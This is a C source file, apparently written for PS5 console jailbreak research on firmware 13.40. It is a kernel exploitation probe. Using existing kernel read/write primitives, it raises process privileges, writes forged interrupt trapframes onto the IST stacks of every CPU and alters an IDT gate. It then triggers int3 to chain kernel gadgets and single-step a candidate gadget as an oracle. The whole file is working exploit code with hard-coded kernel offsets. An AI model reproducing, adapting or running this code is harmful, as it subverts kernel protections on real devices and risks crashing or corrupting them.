/* 13.40 int3 trampoline ladder.
 *
 * STAGE1 (default, "bounce"): int3 -> IDT[3] add_rsp_iret (add rsp,0xE8) ->
 *   F1 at IST7+0xC0 { RIP=add_rsp_iret again, RSP=IST7+0xE8 } -> add rsp,0xE8
 *   -> F2 at IST7+0x1D0 -> userland. No candidate, no TF, no IDT edits.
 * STAGE2 (-DSTAGE2, the TF-oracle): F1 = { RIP=candidate, RFLAGS=TF|IF,
 *   RSP=DATA_CAVE scratch }; #DB -> IDT[1] IST field 7->6 -> add_rsp_iret ->
 *   F3 at IST6+0xC0 -> F4 at IST6+0x1D0 -> userland. Zero net swapgs.
 *   #DB trapframe at IST6-0x28 yields post-instruction CS/RIP/RFLAGS/RSP.
 * Addendum 0xE8 follows from kstuff's parked justreturn frame at IST7+0xC0.
 */
#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <ps5/kernel.h>

#ifndef CANDIDATE_RVA
#define CANDIDATE_RVA 0x255036ULL /* nop_ret (wrmsr_ret+2), kstuff 13.40 */
#endif

static uint64_t g_ist7[16], g_ist6[16];
static uint64_t g_save7[16][0x1B0 / 8], g_save6[16][0x1B0 / 8];
static uint64_t g_gate1[2], g_idt, g_text;
static volatile int g_returned;

static int
readn(uint64_t a, void *b, size_t n) {
  return kernel_copyout((intptr_t)a, b, n);
}

static int
writen(uint64_t a, const void *b, size_t n) {
  return kernel_copyin(b, (intptr_t)a, n);
}

static void
gate_off(const uint8_t *g, uint64_t *off, uint8_t *ist, uint8_t *type) {
  uint16_t lo = 0, mid = 0;
  uint32_t hi = 0;
  memcpy(&lo, g, 2);
  memcpy(&mid, g + 6, 2);
  memcpy(&hi, g + 8, 4);
  *off = ((uint64_t)hi << 32) | ((uint64_t)mid << 16) | lo;
  *ist = g[4] & 7;
  *type = g[5];
}

int
main(void) {
  uint64_t data = (uint64_t)KERNEL_ADDRESS_DATA_BASE;
  uint64_t tss = data + 0x2ee6fe0ULL;
  uint64_t idt = data + 0x2ee4300ULL;
  uint64_t add_rsp_iret = 0x257B36ULL;
  uint64_t cand = 0, cave_scratch = 0;
  uint64_t f1[5], f3[5], f4[5];
  uint64_t user_rsp, dbframe[5], int3frame[5];
  uint8_t gate1[16];
  int fd = open("/data/tforacle_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd < 0)
    fd = open("/mnt/usb0/tforacle_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if(fd < 0)
    fd = open("/usb/tforacle_1340.log", O_WRONLY | O_CREAT | O_TRUNC, 0644);

  if(fd >= 0) {
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);
    if(fd > STDERR_FILENO)
      close(fd);
  }
  setvbuf(stdout, NULL, _IONBF, 0);

#ifdef STAGE2
  printf("stage2 TF-oracle candidate=ktext+0x%" PRIx64 "\n", (uint64_t)CANDIDATE_RVA);
#else
  printf("stage1 bounce probe\n");
#endif
  g_text = (uint64_t)KERNEL_ADDRESS_TEXT_BASE;
  printf("fw=%#x text=%#" PRIx64 "\n", kernel_get_fw_version(), g_text);
  fsync(STDOUT_FILENO);
  if((kernel_get_fw_version() & 0xffff0000U) != 0x13400000U)
    return 1;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);

  add_rsp_iret += g_text;
  cand = g_text + CANDIDATE_RVA;
  cave_scratch = g_text + 0x2D29000ULL + 0x1000ULL;
  g_idt = idt;
  (void)cand;
  (void)cave_scratch;

  if(readn(idt + 16, gate1, 16))
    return 2;
  {
    uint64_t off;
    uint8_t ist, type;
    gate_off(gate1, &off, &ist, &type);
    printf("idt[1] off=%#" PRIx64 " ist=%u type=%#02x expect=%#" PRIx64 "\n",
           off, ist, type, add_rsp_iret);
    fsync(STDOUT_FILENO);
    if(off != add_rsp_iret) {
      printf("ABORT idt[1] target mismatch\n");
      return 3;
    }
  }
  memcpy(g_gate1, gate1, 16);

  for(int cpu = 0; cpu < 16; cpu++) {
    uint64_t row = tss + (uint64_t)cpu * 0x68ULL;
    if(readn(row + 0x54, &g_ist7[cpu], 8) || !g_ist7[cpu] ||
       readn(row + 0x4c, &g_ist6[cpu], 8) || !g_ist6[cpu]) {
      printf("tss read fail cpu=%d\n", cpu);
      return 4;
    }
    if(readn(g_ist7[cpu] + 0x90, g_save7[cpu], sizeof g_save7[cpu]) ||
       readn(g_ist6[cpu] + 0x90, g_save6[cpu], sizeof g_save6[cpu])) {
      printf("ist save fail cpu=%d\n", cpu);
      return 5;
    }
  }
  printf("saved IST6/IST7 regions x16\n");
  fsync(STDOUT_FILENO);

  __asm__ volatile("mov %%rsp, %0" : "=r"(user_rsp));
  f4[0] = (uint64_t)&&returned_here;
  f4[1] = 0x43;
  f4[2] = 0x202;
  f4[3] = user_rsp;
  f4[4] = 0x3b;
  f3[0] = add_rsp_iret;
  f3[1] = 0x20;
  f3[2] = 0x2;
  f3[4] = 0x28;

  for(int cpu = 0; cpu < 16; cpu++) {
#ifdef STAGE2
    f1[0] = cand;
    f1[1] = 0x20;
    f1[2] = 0x102; /* IF clear, TF set */
    f1[3] = cave_scratch;
#else
    f1[0] = add_rsp_iret;
    f1[1] = 0x20;
    f1[2] = 0x2;
    f1[3] = g_ist7[cpu] + 0xE8;
#endif
    f1[4] = 0x28;
    if(writen(g_ist7[cpu] + 0xC0, f1, sizeof f1)) {
      printf("plant7 fail cpu=%d\n", cpu);
      goto restore;
    }
#ifdef STAGE2
    f3[3] = g_ist6[cpu] + 0xE8;
    if(writen(g_ist6[cpu] + 0xC0, f3, sizeof f3) ||
       writen(g_ist6[cpu] + 0x1D0, f4, sizeof f4)) {
      printf("plant6 fail cpu=%d\n", cpu);
      goto restore;
    }
#endif
  }
  printf("planted IST7 x16\n");
  fsync(STDOUT_FILENO);

#ifdef STAGE2
  gate1[4] = (gate1[4] & ~7) | 6;
  if(writen(idt + 16, gate1, 16)) {
    printf("idt[1] write fail\n");
    goto restore;
  }
  printf("idt[1] ist->6\n");
  fsync(STDOUT_FILENO);
#endif

  printf("armed; issuing int3\n");
  fsync(STDOUT_FILENO);
  __asm__ volatile("int3" ::: "memory");
  printf("fell through (no return)\n");
  goto restore;

returned_here:
  g_returned = 1;
  if(readn(g_ist6[0] - 0x28, dbframe, sizeof dbframe))
    memset(dbframe, 0, sizeof dbframe);
  if(readn(g_ist7[0] - 0x28, int3frame, sizeof int3frame))
    memset(int3frame, 0, sizeof int3frame);
  printf("int3frame rip=%#" PRIx64 " cs=%#" PRIx64 " rflags=%#" PRIx64
         " rsp=%#" PRIx64 " ss=%#" PRIx64 "\n",
         int3frame[0], int3frame[1], int3frame[2], int3frame[3], int3frame[4]);
  printf("dbframe   rip=%#" PRIx64 " cs=%#" PRIx64 " rflags=%#" PRIx64
         " rsp=%#" PRIx64 " ss=%#" PRIx64 "\n",
         dbframe[0], dbframe[1], dbframe[2], dbframe[3], dbframe[4]);
#ifdef STAGE2
  printf("instr_len=%lld pivot_rsp=%#" PRIx64 "\n",
         (long long)(dbframe[0] > cand ? (int64_t)(dbframe[0] - cand) : -1),
         dbframe[3]);
#endif

restore:
  if(g_returned)
    writen(g_idt + 16, g_gate1, 16);
  for(int cpu = 0; cpu < 16; cpu++) {
    if(g_ist7[cpu]) {
      writen(g_ist7[cpu] + 0x90, g_save7[cpu], sizeof g_save7[cpu]);
      writen(g_ist6[cpu] + 0x90, g_save6[cpu], sizeof g_save6[cpu]);
    }
  }
  printf("returned=%d\n", g_returned);
  if(g_returned)
    printf("TF_ORACLE_OK\n");
  fsync(STDOUT_FILENO);
  return g_returned ? 0 : 6;
}
